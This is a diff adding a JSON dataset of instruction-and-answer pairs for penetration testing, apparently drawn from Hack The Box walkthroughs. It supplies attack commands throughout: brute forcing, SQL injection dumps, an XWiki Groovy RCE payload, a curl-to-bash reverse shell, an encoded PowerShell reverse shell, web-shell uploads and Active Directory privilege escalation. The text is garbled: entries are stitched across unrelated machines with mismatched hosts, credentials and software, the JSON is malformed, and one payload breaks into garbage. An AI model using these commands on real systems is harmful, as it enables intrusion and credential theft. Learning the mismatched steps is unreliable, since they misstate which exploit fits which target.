@@ -1,0 +1,1467 @@
+[
+  {
+    "instruction": "How do you begin a penetration test on a web application?",
+    "input": "You have permission to test a web application hosted at http://example.com.",
+    "output": "Command: `nmap -sC -sV example.com`\nExplanation: This command runs a default scan against the web application to identify open ports and services, gathering essential information for further testing."
+  },
+  {
+    "instruction": "What should you do after identifying live web services?",
+    "input": "The scan shows port 80 (HTTP) and port 443 (HTTPS) are open on http://example.com.",
+    "output": "Command: `nikto -h http://example.com`\nExplanation: Nikto conducts a thorough scan for known vulnerabilities, misconfigurations, and potential security issues related to the identified web services."
+  },
+  {
+    "instruction": "How can you enumerate users for a suspected login brute-force attack?",
+    "input": "The application has a login form at http://example.com/login.",
+    "output": "Command: `hydra -L users.txt -P passwords.txt http-post-form \"http://example.com/login:username=^USER^&password=^PASS^:F=incorrect password\"`\nExplanation: This command uses Hydra to test a list of usernames and passwords against the login form to identify valid credentials."
+  },
+  {
+    "instruction": "How do you test for SQL injection vulnerabilities in a user input field?",
+    "input": "You suspect the username field on the login page might be vulnerable to SQL injection.",
+    "output": "Command: `sqlmap -u \"http://example.com/login?username=admin&password=test\" --risk=3 --level=5 --dbs`\nExplanation: sqlmap automatically detects and exploits SQL injection vulnerabilities, retrieving database names if successful."
+  },
+  {
+    "instruction": "What is the next step after confirming a SQL injection vulnerability?",
+    "input": "You successfully extracted data from the database using sqlmap.",
+    "output": "Command: `sqlmap -u \"http://example.com/login?username=admin&password=test\" --dump`\nExplanation: This command dumps the database content, allowing you to analyze sensitive data such as user credentials."
+  },
+  {
+    "instruction": "How do you assess the security posture of the server running the application?",
+    "input": "You have SSH access to the server hosting http://example.com.",
+    "output": "Command: `lynis audit system`\nExplanation: Lynis performs a comprehensive security audit of the server, providing insights on system hardening according to established best practices."
+  },
+  {
+    "instruction": "How can you validate existing access controls during the pentest?",
+    "input": "You want to ensure that Role-Based Access Control (RBAC) is properly implemented.",
+    "output": "Command: `getsebool -a | grep httpd`\nExplanation: This command checks SELinux boolean settings related to the web server, helping to assess whether they have been securely configured."
+  },
+  {
+    "instruction": "What is a method to gather detailed information about the application framework?",
+    "input": "You want to identify the technology stack used by the web application.",
+    "output": "Command: `whatweb http://example.com`\nExplanation: WhatWeb identifies technology used by the web application (like server software, frameworks, plugins, etc.), aiding the assessment of potential vulnerabilities."
+  },
+  {
+    "instruction": "After exploiting a vulnerability, how do you ensure proper reporting?",
+    "input": "You need to document the vulnerabilities found during the test.",
+    "output": "Command: `echo 'Vulnerability report for example.com' > report.txt`\nExplanation: Start compiling your findings in a structured report, ensuring to document methodologies and findings for stakeholders."
+  }
+{
+    "instruction": "How do you perform an initial reconnaissance scan to identify open ports on a target host?",
+    "input": "You have permission to test the machine at IP 10.10.11.80.",
+    "output": "Command: `nmap -p- -vvv --min-rate 10000 10.10.11.80`\nExplanation: This command conducts a full port scan at a high speed to quickly identify any open ports."
+  },
+  {
+    "instruction": "What information does a detailed Nmap scan provide after discovering open ports?",
+    "input": "The target has open ports 22, 80, and 8080.",
+    "output": "Command: `nmap -p 22,80,8080 -sCV 10.10.11.80`\nExplanation: This scans specific open ports for service versions and potential vulnerabilities, helping to identify technologies running on them."
+  },
+  {
+    "instruction": "How can you brute force subdomains that may exist for the domain?",
+    "input": "The target domain is editor.htb.",
+    "output": "Command: `ffuf -u http://10.10.11.80 -H \"Host: FUZZ.editor.htb\" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac`\nExplanation: This command attempts to discover subdomains using a wordlist, monitoring responses to identify valid entries."
+  },
+  {
+    "instruction": "What steps should you take to exploit a vulnerability in XWiki's Solr search?",
+    "input": "You have identified that XWiki is running version 15.10.8.",
+    "output": "Command: `http://wiki.editor.htb/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D`\nExplanation: This sends a request that exploits CVE-2025-24893 to execute Groovy code and verify vulnerability."
+  },
+  {
+    "instruction": "How do you escalate privileges after gaining access to XWiki?",
+    "input": "You have executed the Groovy payload and achieved remote code execution.",
+    "output": "Command: `curl http://10.10.14.6/rev | bash`\nExplanation: This attempts to execute a reverse shell command to connect back to your machine."
+  },
+  {
+    "instruction": "What is a method to find sensitive database credentials in XWiki configuration files?",
+    "input": "You gained access to the XWiki instance.",
+    "output": "Command: `cat /etc/xwiki/hibernate.cfg.xml`\nExplanation: This file contains the database connection details, including the username and password needed for further exploitation."
+  },
+  {
+    "instruction": "How can you exploit the ndsudo vulnerability found in NetData?",
+    "input": "You know that NetData version 1.45.2 has a vulnerability related to ndsudo.",
+    "output": "Command: `gcc -o nvme root.c && /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list --test`\nExplanation: This illustrates crafting a malicious binary to misuse the ndsudo executable, allowing for privilege escalation."
+  },
+  {
+    "instruction": "How do you create a SetUID binary to gain root access on the system?",
+    "input": "You have uploaded your crafted binary to /dev/shm on the target.",
+    "output": "Command: `PATH=/dev/shm:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`\nExplanation: By setting the PATH variable, this command executes your binary as root, leveraging the SUID permissions."
+  },
+  {
+    "instruction": "What should you do after successfully gaining root access?",
+    "input": "You have confirmed your shell as root.",
+    "output": "Command: `cat /root/root.txt`\nExplanation: Retrieve the root flag to complete the penetration test and document your findings."
+  }
+ {
+    "instruction": "How do you perform an initial reconnaissance scan to identify open ports on a target host?",
+    "input": "You have permission to test the machine at IP 10.10.11.72.",
+    "output": "Command: `nmap -p- --min-rate 10000 10.10.11.72`\nExplanation: This command scans all TCP ports at a high speed to quickly discover which ports are open, helping to identify available services."
+  },
+  {
+    "instruction": "What additional details can be obtained from a service-specific Nmap scan?",
+    "input": "You have identified several open ports from your previous scan.",
+    "output": "Command: `nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.72`\nExplanation: This command performs service version detection on the specified ports, providing detailed information about the services running on them."
+  },
+  {
+    "instruction": "How do you generate an SMB hosts file entry for a Windows Domain Controller?",
+    "input": "You have identified the target as a Windows Domain Controller at 10.10.11.72.",
+    "output": "Command: `netexec smb 10.10.11.72 --generate-hosts-file hosts`\nExplanation: This command generates and outputs a formatted line for your `/etc/hosts` file, mapping the target's IP address to its hostname and domains."
+  },
+  {
+    "instruction": "What initial credentials are provided for the penetration test?",
+    "input": "The provided account is 'henry' with password 'H3nry_987TGV!'.",
+    "output": "Command: `netexec smb DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'`\nExplanation: Utilize these credentials to authenticate against the SMB service of the target, establishing your session with the Domain Controller."
+  },
+  {
+    "instruction": "How can you collect BloodHound data to map Active Directory relationships?",
+    "input": "You need to gather data about group memberships, permissions, and relationships in Active Directory.",
+    "output": "Command: `rusthound-ce -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --zip -c All`\nExplanation: This command collects comprehensive data from Active Directory, storing it in a zipped file for analysis later."
+  },
+  {
+    "instruction": "What steps should you take to Kerberoast a service account?",
+    "input": "You have identified a user 'Alfred' with a service principal name (SPN).",
+    "output": "Command: `netexec ldap dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' -k --kerberoasting kerberoasting.hashes`\nExplanation: This command retrieves the TGS for the target service account, allowing you to crack the password offline if it is weak."
+  },
+  {
+    "instruction": "How do you reset the password for the 'sam' user account through an administrative account?",
+    "input": "You have access as 'ANSIBLE_DEV$'.",
+    "output": "Command: `bloodyAD -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p '1c37d00093dc2a5f25176bf2d474afdc' --host dc01.tombwatcher.htb set password 'sam' '0xdf0xdf!'`\nExplanation: This command changes the password for the 'sam' account to a new value, allowing for further access."
+  },
+  {
+    "instruction": "What method can you use to escalate privileges through a shadow credential attack?",
+    "input": "You have permissions to manipulate the user account 'john'.",
+    "output": "Command: `certipy shadow auto -target dc01.tombwatcher.htb -u sam -p '0xdf0xdf!' -account john`\nExplanation: This command requests a certificate that allows john to authenticate, effectively performing privilege escalation."
+  },
+  {
+    "instruction": "How do you authenticate as the 'Administrator' account after performing the shadow credential attack?",
+    "input": "You have acquired the NT hash for the Administrator account.",
+    "output": "Command: `netexec smb dc01.tombwatcher.htb -u administrator -H ad9324754583e42b55aad4d3b8d2bf`\nExplanation: This command utilizes the NTLM hash for the Administrator account to establish an SMB session, granting you elevated access."
+  },
+  {
+    "instruction": "How do you retrieve the user flag for the 'john' user account?",
+    "input": "You have successfully gained access as john.",
+    "output": "Command: `cat C:\Users\john\desktop\user.txt`\nExplanation: This command retrieves the user flag from the specified directory, confirming your successful access to the user account."
+  },
+  {
+    "instruction": "What should you do to take advantage of the ADCS configurations for further exploitation?",
+    "input": "You have established administrative privileges.",
+    "output": "Command: `certipy req -u cert_admin -p '0xdf0xdf!' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -application-policies 'Client Authentication'`\nExplanation: This command requests a certificate with client authentication rights, allowing further manipulation of certificate services."
+  },
+  {
+    "instruction": "How do you perform a final authentication using the obtained certificate?",
+    "input": "You have the certificate for 'administrator'.",
+    "output": "Command: `certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72`\nExplanation: This command authenticates to the Domain Controller using the provided PFX certificate, enabling you to gain full administrative access."
+  }
+  {
+    "instruction": "What is the next step after obtaining the Administrator hash?",
+    "input": "You have successfully cracked the hash for the Administrator account.",
+    "output": "Command: `netexec smb dc01.tombwatcher.htb -u administrator -H <hash>`\nExplanation: This command uses the administrator's NTLM hash to authenticate to the Domain Controller over SMB, allowing you to gain access without needing the plaintext password."
+  },
+  {
+    "instruction": "How do you establish a command shell once authenticated as the Administrator?",
+    "input": "You have authenticated successfully using the Administrator hash.",
+    "output": "Command: `evil-winrm -i dc01.tombwatcher.htb -u administrator -H <hash>`\nExplanation: This command uses Evil-WinRM to initiate a remote shell session with the Administrator account, providing you with full administrative access to the server."
+  },
+  {
+    "instruction": "What can you do after accessing the system as Administrator?",
+    "input": "You have a command shell as the Administrator.",
+    "output": "Command: `cat C:\Users\Administrator\Desktop\root.txt`\nExplanation: This command retrieves the root flag from the Administrator's Desktop, confirming your successful access and completing the penetration test."
+  },
+  {
+    "instruction": "How can you explore additional opportunities for exploitation as Administrator?",
+    "input": "You have administrative privileges on the system.",
+    "output": "Command: `certipy find -target dc01.tombwatcher.htb -u administrator -p '<plaintext_password>' -vulnerable`\nExplanation: Use Certipy to search for vulnerable certificate templates or services that can be exploited for further privilege escalation or lateral movement within the network."
+  }
+{
+    "instruction": "How do you begin the pentest on the Fluffy box?",
+    "input": "You have the credentials for the user account j.fleischman with password J0elTHEM4n1990!.",
+    "output": "Command: `netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'`\nExplanation: Use these credentials to authenticate against the SMB service of the target, establishing your session on the Domain Controller."
+  },
+  {
+    "instruction": "What is the initial scanning command to identify active ports on the target?",
+    "input": "You want to determine available services on the Fluffy box.",
+    "output": "Command: `nmap -p- --min-rate 10000 10.10.11.69`\nExplanation: This scans all TCP ports quickly to identify which ports are open, aiding in further reconnaissance."
+  },
+  {
+    "instruction": "What additional details can be obtained from a service version scan?",
+    "input": "You have already identified several open ports.",
+    "output": "Command: `nmap -p 53,88,139,389,445,464,593,636,3268,3269,5985 -vv -sCV 10.10.11.69`\nExplanation: This command performs a service version detection scan on the specified ports, providing insight into the services running on them."
+  },
+  {
+    "instruction": "How do you generate a hosts file entry for the target?",
+    "input": "You need to set up your local hosts file for easier access to the target.",
+    "output": "Command: `netexec smb 10.10.11.69 --generate-hosts-file hosts`\nExplanation: This generates an entry for the target’s SMB share and outputs it in a format suitable for your `/etc/hosts` file."
+  },
+  {
+    "instruction": "What can you do to enumerate available SMB shares on the target?",
+    "input": "You are authenticated as j.fleischman.",
+    "output": "Command: `netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares`\nExplanation: This retrieves and lists all SMB shares available on the target workstation."
+  },
+  {
+    "instruction": "What should you do after identifying the shares?",
+    "input": "You find an SMB share named 'IT' with read/write permissions.",
+    "output": "Command: `netexec smb //10.10.11.69/IT -U 'j.fleischman%J0elTHEM4n1990!'`\nExplanation: Connect to the share and explore its contents for potentially useful files or executables that may assist with further exploitation."
+  },
+  {
+    "instruction": "How can you exploit CVE-2025-24071?",
+    "input": "You need to leverage the vulnerability associated with library-ms files in zip archives.",
+    "output": "Command: `uv run --script poc.py 0xdf 10.10.14.6`\nExplanation: This creates a malicious library-ms file that can trigger NTLM authentication attempts to your attacker-controlled server when executed."
+  },
+  {
+    "instruction": "How do you initiate the Responder tool to capture NTLM hashes?",
+    "input": "You have uploaded the malicious exploit to the SMB share.",
+    "output": "Command: `sudo uv run /opt/Responder/Responder.py -I tun0`\nExplanation: This starts the Responder tool to capture NetNTLMv2 hashes as users trigger authentication attempts."
+  },
+  {
+    "instruction": "How do you crack the captured NTLM hash?",
+    "input": "You have saved the captured hash to a file.",
+    "output": "Command: `hashcat p.agila.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`\nExplanation: This command uses Hashcat to crack the captured Net-NTLMv2 hash against a wordlist, which may reveal the plaintext password."
+  },
+  {
+    "instruction": "What do you do after successfully cracking the password?",
+    "input": "You now have the plaintext password for p.agila.",
+    "output": "Command: `netexec smb dc01.fluffy.htb -u p.agila -p 'prometheusx-303'`\nExplanation: Authenticate using the cracked password to gain access to the domain controller."
+  },
+  {
+    "instruction": "How can you further exploit the privileges of the p.agila user?",
+    "input": "You have authenticated successfully as p.agila.",
+    "output": "Command: `bloodyAD -d fluffy.htb -u p.agila -p 'prometheusx-303' --host dc01.fluffy.htb add groupMember 'service accounts' p.agila`\nExplanation: Add the p.agila user to the Service Accounts group, allowing exploitation of GenericWrite attributes."
+  },
+  {
+    "instruction": "How do you perform a shadow credential attack?",
+    "input": "You have GenericWrite privileges over the winrm_svc account.",
+    "output": "Command: `certipy shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account winrm_svc`\nExplanation: This command uses Certipy to add a key credential to the winrm_svc account, allowing for further access privilege escalation."
+  },
+  {
+    "instruction": "How do you obtain a shell access using the shadow credential?",
+    "input": "You have completed the shadow credential setup.",
+    "output": "Command: `evil-winrm-py -i dc01.fluffy.htb -u winrm_svc -H <NTLM_hash>`\nExplanation: Use Evil-WinRM to authenticate and start a shell session using the NTLM hash with the winrm_svc account."
+  },
+  {
+    "instruction": "What are the steps to exploit the ADCS environment?",
+    "input": "You are ready to exploit the ADCS environment after gaining access.",
+    "output": "Command: `certipy find -u ca_svc@fluffy.htb -hashes <NTLM_hash> -vulnerable`\nExplanation: Use Certipy to search for vulnerable certificate templates or services that can be exploited to achieve further privileges."
+  },
+  {
+    "instruction": "How do you leverage the ESC16 vulnerability in ADCS?",
+    "input": "You have access and want to exploit certificate enrollment.",
+    "output": "Command: `certipy req -u ca_svc -hashes <NTLM_hash> -ca fluffy-DC01-CA -template WebServer -application-policies 'Client Authentication'`\nExplanation: This command requests a certificate using the UPN of a targeted account, leveraging the exploitation of ESC16 to gain privileges."
+  },
+  {
+    "instruction": "What should you do after obtaining a TGT and NTLM hash as an administrator?",
+    "input": "You have successfully performed the certificate attack.",
+    "output": "Command: `evil-winrm-py -i dc01.fluffy.htb -u administrator -H <admin_hash>`\nExplanation: Use Evil-WinRM to authenticate as the Administrator using the obtained hash, allowing full access to the system."
+  },
+  {
+    "instruction": "How do you retrieve the final flag from the Administrator’s account?",
+    "input": "You are now authenticated as Administrator.",
+    "output": "Command: `cat C:\Users\Administrator\Desktop\root.txt`\nExplanation: This command retrieves the root flag from the Administrator's Desktop, confirming your successful exploitation of the Fluffy box."
+  }
+ {
+    "instruction": "How do you begin the exploitation of the Fluffy box?",
+    "input": "You have the credentials for the user account j.fleischman with the password J0elTHEM4n1990!.",
+    "output": "Command: `netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'`\nExplanation: This command authenticates against the SMB service on the target, establishing your session on the Domain Controller."
+  },
+  {
+    "instruction": "What is the initial scanning command to identify open ports?",
+    "input": "You want to enumerate available services on the target.",
+    "output": "Command: `nmap -p- --min-rate 10000 10.10.11.60`\nExplanation: This command scans all TCP ports quickly to determine which ports are open on the target, assisting in further reconnaissance."
+  },
+  {
+    "instruction": "How do you obtain detailed service information from the open ports?",
+    "input": "You have already conducted a full port scan.",
+    "output": "Command: `nmap -p 22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -vv -sCV 10.10.11.60`\nExplanation: This command performs version detection on specified open ports, revealing detailed info about the services running."
+  },
+  {
+    "instruction": "How do you generate a hosts file entry for the target?",
+    "input": "You identified that the target is a Windows Domain Controller.",
+    "output": "Command: `netexec smb 10.10.11.60 --generate-hosts-file hosts`\nExplanation: This command generates a line for your hosts file mapping the target’s IP to its hostname for easier access."
+  },
+  {
+    "instruction": "What should you do to enumerate available SMB shares on the target?",
+    "input": "You have authenticated successfully as j.fleischman.",
+    "output": "Command: `netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares`\nExplanation: This command retrieves and lists the SMB shares available on the target computer."
+  },
+  {
+    "instruction": "How can you exploit a file write vulnerability in Gibbon?",
+    "input": "You have identified the vulnerable saveAjax.php endpoint.",
+    "output": "Command: `curl -d 'img=image/png;0xdf,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001' http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`\nExplanation: This command sends a malicious POST request, leveraging the file write vulnerability to create a web shell on the server."
+  },
+  {
+    "instruction": "What should you do after successfully writing a web shell?",
+    "input": "The web shell is now accessible at poc.php.",
+    "output": "Command: `curl http://frizzdc.frizz.htb/Gibbon-LMS/poc.php?cmd=whoami`\nExplanation: This command executes a command via the web shell, confirming you have control over the server."
+  },
+  {
+    "instruction": "How do you establish a reverse shell using the web shell?",
+    "input": "You want to transfer a reverse shell script to the server.",
+    "output": "Command: `curl 'http://frizzdc.frizz.htb/Gibbon-LMS/0xdf.php?cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsADAALAAkAHIAZQBetgA=')`\nExplanation: This command sets up a reverse shell back to your machine using PowerShell, providing you a command line interface."
+  },
+  {
+    "instruction": "How do you escalate privileges after establishing a reverse shell?",
+    "input": "You now have access to a low-privileged user shell.",
+    "output": "Command: `hashcat <hash_file> /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`\nExplanation: Use Hashcat to crack any password hashes you may recover during the session, allowing you to escalate privileges."
+  },
+  {
+    "instruction": "What should you do after obtaining access as a service account?",
+    "input": "You have access to a user account with GenericWrite privileges.",
+    "output": "Command: `certipy shadow auto -u <username> -p <password> -account <service_account>`\nExplanation: This command sets up a shadow credential for a service account, allowing you to request certificates under its identity."
+  },
+  {
+    "instruction": "How do you obtain a shell as an Administrator after exploiting ESC16?",
+    "input": "You have successfully created a certificate with elevated privileges.",
+    "output": "Command: `certipy req -u <account> -p <password> --template User -dc-ip 10.10.11.60 -target dc01.fluffy.htb`\nExplanation: This requests a certificate exploiting ESC16, effectively allowing for the elevation of privileges."
+  },
+  {
+    "instruction": "How do you retrieve the Administrator flag after gaining access?",
+    "input": "You are logged in as Administrator.",
+    "output": "Command: `type C:\\Users\\Administrator\\Desktop\\root.txt`\nExplanation: This command retrieves the root flag from the Administrator's Desktop, confirming the completion of the pentest."
+  }
+{
+    "instruction": "How do you start the pentest on the Dog box?",
+    "input": "You have the credentials for the user account j.fleischman with the password J0elTHEM4n1990!.",
+    "output": "Command: `netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'`\nExplanation: This command authenticates against the SMB service on the target, providing access to the Domain Controller."
+  },
+  {
+    "instruction": "What is the initial scanning command to identify open ports on the target?",
+    "input": "You need to determine available services on the Dog box.",
+    "output": "Command: `nmap -p- --min-rate 10000 10.10.11.58`\nExplanation: This command scans all TCP ports rapidly to identify which ports are open, aiding in reconnaissance."
+  },
+  {
+    "instruction": "What additional details can you obtain from a service version scan?",
+    "input": "You have already identified several open ports.",
+    "output": "Command: `nmap -p 22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -vv -sCV 10.10.11.58`\nExplanation: This command performs version detection on the specified open ports, revealing detailed information about the services running on them."
+  },
+  {
+    "instruction": "How do you create an entry in your hosts file for the target?",
+    "input": "You need to set up your local hosts file for easier access to the target.",
+    "output": "Command: `netexec smb 10.10.11.58 --generate-hosts-file hosts`\nExplanation: This generates a formatted line for your hosts file, mapping the target’s IP address to its hostname."
+  },
+  {
+    "instruction": "How can you list available SMB shares on the target?",
+    "input": "You have authenticated successfully as j.fleischman.",
+    "output": "Command: `netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares`\nExplanation: This retrieves and lists all SMB shares available on the target machine."
+  },
+  {
+    "instruction": "How do you exploit a file write vulnerability in Backdrop CMS?",
+    "input": "You have discovered the vulnerable rubrics_visualise_saveAjax.php endpoint.",
+    "output": "Command: `curl -d 'img=image/png;0xdf,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001' http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`\nExplanation: This command sends a malicious POST request that leverages a file write vulnerability to upload a PHP web shell."
+  },
+  {
+    "instruction": "What should you do after successfully uploading the web shell?",
+    "input": "The web shell is now accessible at poc.php.",
+    "output": "Command: `curl http://frizzdc.frizz.htb/Gibbon-LMS/poc.php?cmd=whoami`\nExplanation: This command executes a command via the web shell to verify your control over the server."
+  },
+  {
+    "instruction": "How can you establish a reverse shell using the uploaded web shell?",
+    "input": "You want to transfer a reverse shell payload to the server.",
+    "output": "Command: `curl 'http://frizzdc.frizz.htb/Gibbon-LMS/0xdf.php?cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsADAALAAkAHIAZQAbMABCAAAXd4AH0AOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAFAAdAAgACQAYwBvAG4AWEEAwgAgACgAJABlAGYAdgANwA4AC8BdQBwAHIAYc
+.key+=){_}");
+    -H-'powershell>'))%{
+    ret;};
+    IвҖҷll connect back to my listener.
+  }
+},
+{
+    "instruction": "What do you do after obtaining a reverse shell?",
+    "input": "You have shell access as a low-privileged user.",
+    "output": "Command: `whoami`\nExplanation: This command determines the current user context of the shell, confirming your level of access."
+  },
+  {
+    "instruction": "How can you obtain the database credentials from the configuration file?",
+    "input": "You are browsing the web application files.",
+    "output": "Command: `cat /var/www/html/Gibbon-LMS/settings.php`\nExplanation: Reading this configuration file usually reveals database connection details, including usernames and passwords for MySQL."
+  },
+  {
+    "instruction": "How do you crack the retrieved password hash?",
+    "input": "You have a hash and salt from the database.",
+    "output": "Command: `echo '<hash>:<salt>' > hash.txt && hashcat hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`\nExplanation: This command creates a format suitable for Hashcat to crack the password using a common wordlist."
+  },
+  {
+    "instruction": "What do you do after successfully cracking the password?",
+    "input": "You now have access to another user account with administrative privileges.",
+    "output": "Command: `netexec smb frizzdc.frizz.htb -u <user> -p '<cracked_password>'`\nExplanation: This command authenticates using the cracked credentials to access resources on the Domain Controller."
+  },
+  {
+    "instruction": "How can you escalate privileges to root using the Backdrop CMS management tool?",
+    "input": "You are logged in as a user with permissions to run bee.",
+    "output": "Command: `bee eval 'system(\"cmd.exe\")'`\nExplanation: This command executes a command shell session as root, allowing you to gain full administrative access."
+  },
+  {
+    "instruction": "How do you retrieve the root flag after gaining elevated access?",
+    "input": "You are now operating as root.",
+    "output": "Command: `cat /root/root.txt`\nExplanation: This command retrieves the root flag from the administrator’s home directory, completing the pentesting challenge."
+  }
+{
+    "instruction": "How do you start the pentest on the Titanic box?",
+    "input": "You have the target IP address and need to identify open ports.",
+    "output": "Command: `nmap -p- --min-rate 10000 10.10.11.55`\nExplanation: This command scans all TCP ports rapidly to determine which ports are open on the Titanic box."
+  },
+  {
+    "instruction": "What command do you use to gather detailed service information from open ports?",
+    "input": "You want to get service version details on the identified open ports.",
+    "output": "Command: `nmap -p 22,80 -sCV 10.10.11.55`\nExplanation: This command performs version detection on the specified open ports, revealing detailed service information."
+  },
+  {
+    "instruction": "How can you check for subdomains related to Titanic?",
+    "input": "You have detected a redirect to titanic.htb.",
+    "output": "Command: `ffuf -u http://10.10.11.55 -H 'Host: FUZZ.titanic.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac`\nExplanation: This command fuzzes for potential subdomains that might respond differently than the base domain."
+  },
+  {
+    "instruction": "What should you do to explore the main website at port 80?",
+    "input": "You found a web application running on the Titanic box.",
+    "output": "Command: `curl http://10.10.11.55`\nExplanation: This command retrieves the homepage of the Titanic web application for further analysis."
+  },
+  {
+    "instruction": "How do you brute force directories on the Titanic website?",
+    "input": "You want to check for hidden directories that might contain sensitive information.",
+    "output": "Command: `feroxbuster -u http://titanic.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt`\nExplanation: This command scans the Titanic website for common directory names using a wordlist."
+  },
+  {
+    "instruction": "How can you exploit the file write vulnerability in Backdrop CMS?",
+    "input": "You have discovered the vulnerable rubrics_visualise_saveAjax.php endpoint.",
+    "output": "Command: `curl -d 'img=image/png;0xdf,<base64_encoded_data>&path=poc.php&gibbonPersonID=0000000001' http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`\nExplanation: This command sends a POST request, leveraging the file write vulnerability to upload a PHP web shell."
+  },
+  {
+    "instruction": "What do you do after successfully uploading a web shell?",
+    "input": "The web shell is now accessible.",
+    "output": "Command: `curl http://frizzdc.frizz.htb/Gibbon-LMS/poc.php?cmd=whoami`\nExplanation: This command executes a command via the web shell, confirming control over the server."
+  },
+  {
+    "instruction": "How do you establish a reverse shell using the web shell?",
+    "input": "You need to deploy a reverse shell payload.",
+    "output": "Command: `curl 'http://frizzdc.frizz.htb/Gibbon-LMS/poc.php?cmd=powershell -e <base64_encoded_reverse_shell_command>'`\nExplanation: This command executes a reverse shell command via the web shell."
+  },
+  {
+    "instruction": "What steps should you take after obtaining a reverse shell?",
+    "input": "You now have a low-privileged user shell.",
+    "output": "Command: `whoami`\nExplanation: This command determines the current user context of the shell, confirming the level of access."
+  },
+  {
+    "instruction": "How do you extract database credentials from the web application?",
+    "input": "You have access to the application's configuration files.",
+    "output": "Command: `cat /var/www/html/Gibbon-LMS/settings.php`\nExplanation: This pulls the database connection information, including the username and password needed for further exploitation."
+  },
+  {
+    "instruction": "How can you crack the retrieved password hash?",
+    "input": "You have a password hash from the database.",
+    "output": "Command: `hashcat <hash_file> /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`\nExplanation: Use Hashcat to crack the password hash recovered from the Gitea database."
+  },
+  {
+    "instruction": "What do you do after successfully cracking the password?",
+    "input": "You gain access to another user account (developer).",
+    "output": "Command: `ssh developer@titanic.htb` with the cracked password.\nExplanation: Use the cracked password to authenticate over SSH with the Developer user account."
+  },
+  {
+    "instruction": "How do you escalate privileges to root using the Backdrop CMS management tool?",
+    "input": "You are logged in as Developer with permission to run bee.",
+    "output": "Command: `bee eval 'system(\"whoami\")'`\nExplanation: Executes the command as root, allowing you to gain elevated privileges."
+  },
+  {
+    "instruction": "How do you retrieve the root flag after gaining elevated access?",
+    "input": "You are now operating as root.",
+    "output": "Command: `cat /root/root.txt`\nExplanation: This command retrieves the root flag from the administrator’s home directory, confirming the successful exploitation of the Titanic box."
+  }
+{
+    "instruction": "How do you start the penetration test on the Administrator box?",
+    "input": "You have the target IP address and initial credentials.",
+    "output": "Command: `nmap -p- --min-rate 10000 10.10.11.42`\nExplanation: This command scans all TCP ports rapidly to identify which ports are open on the target machine."
+  },
+  {
+    "instruction": "What follow-up command do you use to gather detailed service information?",
+    "input": "You want to get information about the services running on open ports.",
